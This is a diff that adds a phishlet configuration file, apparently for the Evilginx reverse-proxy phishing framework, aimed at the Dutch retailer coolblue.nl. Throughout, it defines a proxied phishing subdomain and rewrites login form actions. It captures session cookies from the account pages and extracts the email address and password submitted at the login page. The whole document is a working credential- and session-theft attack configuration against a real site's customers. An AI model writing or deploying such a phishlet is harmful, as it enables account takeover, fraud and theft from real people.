@@ -1,0 +1,30 @@
+author: '@Jerp'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'elo', orig_sub: 'www', domain: 'coolblue.nl', session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: 'www.coolblue.nl', orig_sub: 'www', domain: 'coolblue.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+
+auth_tokens:
+  - domain: 'www.coolblue.nl'
+    keys: ['assignedVariations']
+
+auth_urls:
+  - '/mijn-coolblue-account'
+  - '/mijn-coolblue-account/.*'  
+ 
+
+credentials:
+  username:
+    key: 'emailaddress'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.coolblue.nl'
+  path: '/inloggen'
